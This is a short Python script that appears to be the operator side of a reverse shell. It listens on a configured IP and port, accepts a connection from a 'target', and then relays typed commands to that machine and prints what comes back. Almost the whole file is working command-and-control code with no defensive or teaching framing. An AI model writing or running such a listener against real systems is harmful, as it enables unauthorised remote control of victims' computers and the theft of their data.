import socket
import tools.config as config
import tools.utility as utility

def target_communication(target_socket,ip):
    while True:
        cmd = input('* Shell~%s: ' % str(ip))
        utility.reliable_send(target_socket,cmd)
        if cmd == ' quit':
            break
        else:
            res = utility.reliable_recv(target_socket)
            print(res)

serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
## socket.AF_NET : ipv4 add
## socket.SOCK_STREAM tcp conn

# bind ip and port
serv_socket.bind((config.server_ip,config.port))

# start listening incomming conn
print('[+] Listening for incomming connections...')
serv_socket.listen(5)

# store connection in var
target_socket, ip = serv_socket.accept()

print('[+] Target connected from : ' + str(ip))

target_communication(target_socket,ip)